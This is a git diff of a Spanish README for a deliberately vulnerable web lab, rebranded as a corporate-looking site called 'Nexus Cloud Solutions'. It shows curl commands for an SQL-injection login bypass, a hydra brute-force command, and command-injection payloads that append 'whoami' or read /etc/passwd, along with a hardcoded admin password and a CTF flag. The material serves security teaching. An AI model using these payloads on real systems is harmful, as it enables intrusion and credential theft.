@@ -1,40 +1,87 @@
-# SecDemo Interactive Lab 🛡️
+# Nexus Cloud Solutions 🌐
 
-Simulador interactivo y visual de vulnerabilidades web (Inyección SQL, Ataque de Fuerza Bruta y Ejecución de Comandos del Sistema Operativo) diseñado para demostraciones en vivo, charlas y formación técnica.
+Plataforma web con aspecto y comportamiento 100% corporativo diseñada para pruebas de penetración y demostraciones de ciberseguridad ejecutadas **directamente desde tu propia terminal** (`curl`, `hydra`, `sqlmap`, scripts de Python, etc.).
 
-## 🚀 Despliegue en Vercel
-
-Esta aplicación está construida con arquitectura **100% estática y serverless**, lo que garantiza que:
-* Se despliega de forma inmediata en Vercel sin dependencias pesadas.
-* No compromete la infraestructura de hosting ni expone servicios reales vulnerables al exterior.
-* Ofrece una experiencia visual fluida e instantánea en vivo.
-
-### Opción 1: Con Vercel CLI
-```bash
-# 1. Instalar Vercel CLI (si no lo tienes)
-npm install -g vercel
-
-# 2. Desplegar desde la carpeta del proyecto
-vercel
-```
-
-### Opción 2: Conectar con GitHub
-1. Sube este directorio a un repositorio de GitHub.
-2. Ingresa a [vercel.com](https://vercel.com) e importa tu repositorio.
-3. Vercel detectará automáticamente los archivos estáticos y publicará la web con HTTPS gratuito.
+Totalmente optimizada para desplegarse en **Vercel** usando Serverless Functions en Node.js.
 
 ---
 
-## 🎯 Módulos incluidos en la Demostración
+## 🎯 Endpoints y Pruebas desde tu Terminal
 
-1. **💉 Inyección SQL (SQLi):**
-   * Demuestra cómo la concatenación de variables en sentencias SQL permite evadir autenticaciones (`admin' OR '1'='1`).
-   * Visualiza la diferencia con el uso de **Prepared Statements** (consultas parametrizadas).
+### 1. 💉 Inyección SQL (SQLi)
+* **Endpoint:** `POST /api/login`
+* **Prueba con `curl`:**
+```bash
+# Bypass de autenticación mediante SQL Injection
+curl -X POST https://TU-DOMINIO.vercel.app/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"username": "admin'\'' OR '\''1'\''='\''1", "password": "cualquiercosa"}'
+```
+* **Respuesta esperada:**
+```json
+{
+  "success": true,
+  "message": "Inicio de sesión correcto (Acceso Administrativo)",
+  "user": {
+    "id": 1,
+    "username": "admin",
+    "role": "SuperAdministrator",
+    "token": "nexus_admin_sess_9941a8e2",
+    "internal_flag": "FLAG-SQLI{nexus_sql_injection_bypass_success}"
+  }
+}
+```
 
-2. **⚡ Fuerza Bruta & Rate Limiting:**
-   * Simulación interactiva de ataque de diccionario contra endpoints de autenticación.
-   * Telemetría en tiempo real: Peticiones por segundo, registro HTTP y demostración de respuesta `HTTP 429 Too Many Requests`.
+---
 
-3. **🖥️ Inyección de Comandos & Shell:**
-   * Muestra el riesgo de invocar utilidades del sistema (`ping`) concatenando entradas sin sanitizar.
-   * Explicación de mitigaciones mediante listas blancas de caracteres y APIs seguras.
+### 2. ⚡ Fuerza Bruta de Credenciales
+* **Endpoint:** `POST /api/login`
+* **Usuario válido en el sistema:** `admin` (Contraseña correcta: `dragon2024`)
+* **Prueba de intento fallido:**
+```bash
+curl -X POST https://TU-DOMINIO.vercel.app/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"username": "admin", "password": "password123"}'
+```
+* **Respuesta de fallo (HTTP 401 Unauthorized):**
+```json
+{
+  "success": false,
+  "error": "Credenciales inválidas"
+}
+```
+
+* **Prueba con Hydra (Diccionario):**
+```bash
+hydra -l admin -P diccionario.txt TU-DOMINIO.vercel.app https-post-form "/api/login:{\"username\":\"^USER^\",\"password\":\"^PASS^\"}:Credenciales inválidas"
+```
+
+---
+
+### 3. 🖥️ Inyección de Comandos del Sistema (Command Injection)
+* **Endpoint:** `GET /api/ping?host={host}` o `POST /api/ping`
+* **Ping legítimo con `curl`:**
+```bash
+curl "https://TU-DOMINIO.vercel.app/api/ping?host=8.8.8.8"
+```
+* **Inyección de comandos arbitrarios:**
+```bash
+# Ejecutar 'whoami'
+curl "https://TU-DOMINIO.vercel.app/api/ping?host=8.8.8.8;whoami"
+
+# Leer archivo /etc/passwd simulado
+curl "https://TU-DOMINIO.vercel.app/api/ping?host=127.0.0.1%26%26cat%20/etc/passwd"
+```
+
+---
+
+## 🚀 Despliegue en Vercel
+
+1. Haz push a tu repositorio de GitHub:
+   ```bash
+   git add .
+   git commit -m "Deploy NexusCloud"
+   git push origin main
+   ```
+2. Entra en [vercel.com/new](https://vercel.com/new) e importa tu repositorio `lopezjesus-cyber/vul_web`.
+3. Vercel desplegará tanto el frontend estático como las funciones serverless (`/api/login` y `/api/ping`) con HTTPS automático.
